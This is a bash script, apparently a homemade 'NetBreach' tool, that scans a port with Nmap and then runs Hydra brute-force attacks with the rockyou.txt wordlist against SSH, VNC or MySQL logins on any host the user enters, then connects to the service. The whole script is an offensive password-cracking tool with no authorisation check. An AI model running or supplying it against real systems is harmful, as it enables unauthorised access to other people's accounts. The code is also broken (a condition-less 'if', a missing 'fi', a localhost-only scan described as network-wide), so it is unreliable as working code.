#!/bin/bash

# Load variables
source DontEdit.sh

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Check for --help argument
show_help() {
    xmessage -center "HELP MENU\n\n
Programs Used:\n
- Hydra\n
- Nmap\n\n
How to Use:\n
1. Enter the port you want to scan.\n
2. If ports are open, provide a username and hostname.\n
3. The program will attempt to crack the given credentials.\n\n
Common Ports:\n
- SSH: 22\n
- VNC: 5900\n
- MySQL: 3306\n
To scan all ports, type 'ALL'."
}

# Function to check and install missing packages
install_missing_packages() {
    if 
    for package in "${required_packages[@]}"; do
        if ! command_exists "$package"; then
            dialog --yesno "The package '${package}' is missing. Would you like to install it?" 10 40
            if [[ $? -eq 0 ]]; then
                bash requirements.sh || {
                    dialog --msgbox "Failed to install '${package}'. Exiting." 10 40
                    exit 1
                }
            else
                dialog --msgbox "Cannot proceed without '${package}'. Exiting." 10 40
                exit 1
            fi
        fi
    done
}

# Internet connectivity check
check_internet() {
    if ! curl -s --head --fail https://google.com/ > /dev/null; then
        dialog --msgbox "Internet connection is required. Please check your connection." 10 40
        exit 1
    fi
}

# Main functionality
NetBreach() {
    port=$(dialog --inputbox "Enter the port to scan (SSH: 22, VNC: 5900, MySQL: 3306).\nType 'ALL' to scan all ports:" 10 40 3>&1 1>&2 2>&3)

    case "${port}" in
    ALL|all)
        xmessage -center "Scanning the entire network. This might take some time."
        sudo nmap -sS 127.0.0.1 -Pn -oN scan.txt --open
        ;;
    stop)
        xmessage -center "Exiting program."
        exit 0
        ;;
    *)
        if [[ ! "${port}" =~ ^[0-9]+$ ]]; then
            xmessage -center "Error: Invalid port number."
            exit 1
        fi
        sudo nmap -sS 127.0.0.1 -p "${port}" -oN "${port}.log" --open
        dialog --yesno "Do you want to open the scan results?" 10 40
        if [[ $? -eq 0 ]]; then
            xdg-open "${port}.log"
        fi
        ;;
    esac
}

# Crack service credentials
RunHackingCommand() {
    user=$(dialog --inputbox "Enter Username:" 10 40 3>&1 1>&2 2>&3)
    host=$(dialog --inputbox "Enter Hostname:" 10 40 3>&1 1>&2 2>&3)
    port=$(dialog --inputbox "Enter Port:" 10 40 3>&1 1>&2 2>&3)

    case "$port" in
    22)
        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"$host":"$port"
        xmessage -center "Connecting to ${user}@${host}:${port}"
        ssh "${user}@${host}" -p "${port}"
        ;;
    5900)
        hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://"$host":"$port"
        xmessage -center "Connecting to ${host}:${port} via VNC."
        xdg-open "vnc://${host}"
        ;;
    3306)
        hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I mysql://"${host}":"${port}"
        xmessage -center "Connecting to MySQL at ${host}:${port}"
        mysql -u "${user}" -p
        ;;
    *)
        xmessage -center "Error: Unsupported port/service."
        ;;
    esac
}

# Main execution flow
if [[ "$1" == "--help" || "$1" == "-h" ]]; then
    show_help
if [[ "$1" == "--skip" ]]; then
    echo "Skipping package check"
    check_internet  
    NetBreach
    RunHackingCommand
else
    install_missing_packages
    check_internet
    NetBreach
    RunHackingCommand
fi